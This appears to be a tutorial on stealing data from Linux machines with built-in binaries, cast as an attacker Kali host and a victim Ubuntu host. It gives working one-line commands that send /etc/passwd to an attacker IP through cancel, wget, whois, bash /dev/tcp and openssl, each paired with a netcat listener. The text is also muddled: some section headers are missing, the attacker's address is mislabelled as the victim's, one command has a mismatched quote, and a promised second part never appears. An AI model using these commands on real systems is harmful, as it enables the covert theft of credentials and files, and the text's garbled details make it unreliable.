Have you ever heard about your critical data being exported somewhere else without your knowledge? Data exfiltration is a method of breaching the security and having illegal access over the data of the user’s system or a server.

Introduction to Data Exfiltration
Data exfiltration in simpler terms is also known as Data Theft or Data Exportation. These terms generally define the method of attackers having unauthorized access to a user’s data and sneakily make a copy of it by gaining access to the system or the network. Data exfiltration can be performed in various methods with their primary intent of stealing data.  This form of attack usually goes undetected. In this article, we are going to learn about data exfiltration by using Linux binaries.

Introduction to Linux Binaries
Binaries can be described as files that contain source codes compiled together. These binary files are also called as executables files, as they can be executed in the system.  Here, we will be using file uploading binaries to perform data exfiltration. This article is divided into two part;

Data exfiltration using default Linux Binaries
Data exfiltration using apt-installed Linux binaries
Now, switch on the Linux operating systems i.e. Kali Linux and Ubuntu. We will simultaneously see one of the two systems posing as an attacker and the other as a victim.

Data exfiltration using default Linux Binaries
/Cancel
We can use /cancel binary to sneakily use file upload and send the file to the attacker machine over TCP connection.

Victim Machine

Here the Ubuntu system is the victim machine. To upload the file from the victim system to the attacker system by entering the file to upload, the victim IP, and the remote port for file transfer. To perform data exfiltration you can type

cancel -u "$(cat /etc/passwd)" -h 192.168.0.147:1234


Attacker Machine
Here the Kali Linux is used as the attacker machine that uses port 1234 for listening using Netcat, you can use

nc -lvp 1234
Here you see that the contents of the file /etc/passwd with all the users are listed.



/wget
It is a computer program that usually retrieves content from web servers.  We can use /wget binary to sneakily use file upload and send the file to the attacker machine over HTTP POST.

Victim Machine

Here we use Ubuntu on our victim machine and send a local file with an HTTP POST request. To implement this, you can use the command

wget --post-file=/etc/passwd 192.168.0.147


Attacker Machine

Here we are using Kali Linux as the attacker machine. To get the file, Netcat is used as a listener, and type this command,

nc -lvp 80
Here you see that the contents of the file /etc/passwd with all the users are listed on the attacker machine.



/whois
We can use /whois binary to sneakily use file upload and send the file to the attacker machine over TCP connection.

Victim Machine

Here the Ubuntu system is the victim machine. To upload the file from the victim system to the attacker system by entering the file to upload, the victim IP, and the remote port for file transfer. To perform data exfiltration, you can type

whois -h 192.168.0.147 -p 43 `cat  /etc/passwd`


Attacker Machine

Here the Kali Linux is used as the attacker machine that uses port 43 for listening using Netcat, you can use

nc -lvp 43

Victim Machine

Here we have made use of the Ubuntu system as the victim machine. To upload the file from the victim system to the attacker system by entering the file to upload, the victim IP, and the remote port for file transfer. To perform data exfiltration, you can type

bash -c 'echo -e "POST / HTTP/0.9\n\n$(</etc/passwd)" > /dev/tcp/192.168.0.147/1234’


Attacker Machine

Here the Kali Linux is used as the attacker machine that uses port 1234 for listening using Netcat, you can use

nc -lvp 1234

Here we have made use of the Ubuntu system as the victim machine. To upload the file from the victim system to the attacker system by entering the file to upload, the victim IP, and the remote port for file transfer. To perform data exfiltration, you can type

openssl s_client -quiet -connect 192.168.0.147:1234 < "/etc/passwd"
